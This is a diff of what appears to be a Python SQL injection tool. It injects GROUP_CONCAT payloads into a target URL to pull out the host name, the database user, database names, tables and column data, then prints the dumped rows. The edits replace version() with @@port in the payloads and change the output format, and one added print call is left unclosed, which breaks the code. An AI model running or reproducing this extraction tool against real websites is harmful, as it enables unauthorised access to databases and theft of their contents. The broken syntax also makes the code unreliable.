@@ -794,16 +794,16 @@ if target_url:
                                                 
 
                                           print("[INFO] Starting Enumerate table name DBMS...")
-                                          payload_2 = "(SELECT+GROUP_CONCAT(@@hostname,'::',version()))"
+                                          payload_2 = "(SELECT+GROUP_CONCAT(@@hostname,'::',@@port))"
                                           get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                           results_get_user = requests.get(target_url + get_user)
                                           html_cont = results_get_user.text
-                                          userss = r"\b\w+@\b\w+::\b"
+                                          userss = r"\b\w+::\b"
                                           dump_all = re.findall(userss, html_cont)
                                           for user in dump_all:
                                               print("[-] Host name :", user)
-                                          
-                                          payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',version()))"
+                                              
+                                          payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',@@port))"
                                           get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                           results_get_user = requests.get(target_url + get_user)
                                           html_cont = results_get_user.text
@@ -812,7 +812,7 @@ if target_url:
                                           for user in dump_all:
                                               print("operating Enumerate: ")
                                               print("web server operating user mysql :", user)
-                                          payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',version()))"
+                                          payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',@@port))"
                                           get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                           results_get_dbs = requests.get(target_url + get_dbs)
                                           html_cont = results_get_dbs.text
@@ -849,7 +849,7 @@ if target_url:
                                           print("Table Name | Columns Name")
                                           print("--------------------------")
                                           for database in database_all:
-                                              print(f"[+] Find DBMS from {dbs} --> ", database)
+                                              print(f"[+] {database} --> ", dbs, user)
                                               time.sleep(0.10)
                                           print('------------------------------------------------------------------------------')
                                           print(database_all)
@@ -867,7 +867,9 @@ if target_url:
                                               checking_data = r"\b\w+::\b"
                                               data_all = re.findall(checking_data, texts_html)
                                               for data in data_all:
-                                                  print(f"[+] | {text_dump} | {dbs} |=> ", data)
+                                                  print("+-----------------------------------------------------+"
+                                                  print(f"[+] | {text_dump} | {text_dump2} | {dbs} |=> ", data)
+                                                  print("+-----------------------------------------------------+")
                                           exit()
                                       else:
                                           pass
@@ -1614,7 +1616,7 @@ if target_url:
                                               print("web server operating version : MySQL >= 11.4 ")
 
                                           print("[INFO] Starting Enumerate table name DBMS...")
-                                          payload_2 = "(SELECT+GROUP_CONCAT(@@hostname,'::',version()))"
+                                          payload_2 = "(SELECT+GROUP_CONCAT(@@hostname,'::',@@port))"
                                           get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                           results_get_user = requests.get(target_url + get_user)
                                           html_cont = results_get_user.text
@@ -1623,7 +1625,7 @@ if target_url:
                                           for user in dump_all:
                                               print("[-] Host name :", user)
                                               
-                                          payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',version()))"
+                                          payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',@@port))"
                                           get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                           results_get_user = requests.get(target_url + get_user)
                                           html_cont = results_get_user.text
@@ -1632,7 +1634,7 @@ if target_url:
                                           for user in dump_all:
                                               print("operating Enumerate: ")
                                               print("web server operating user mysql :", user)
-                                          payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',version()))"
+                                          payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',@@port))"
                                           get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                           results_get_dbs = requests.get(target_url + get_dbs)
                                           html_cont = results_get_dbs.text
@@ -1669,7 +1671,7 @@ if target_url:
                                           print("Table Name | Columns Name")
                                           print("--------------------------")
                                           for database in database_all:
-                                              print(f"[+] Find DBMS from {dbs} --> ", database)
+                                              print(f"[+] {database} --> ", dbs, user)
                                               time.sleep(0.10)
                                           print('------------------------------------------------------------------------------')
                                           print(database_all)
@@ -1687,7 +1689,9 @@ if target_url:
                                               checking_data = r"\b\w+::\b"
                                               data_all = re.findall(checking_data, texts_html)
                                               for data in data_all:
-                                                  print(f"[+] | {text_dump} | {dbs} |=> ", data)
+                                                  print("+-----------------------------------------------------+"
+                                                  print(f"[+] | {text_dump} | {text_dump2} | {dbs} |=> ", data)
+                                                  print("+-----------------------------------------------------+")
                                           exit()
                                       else:
                                           pass
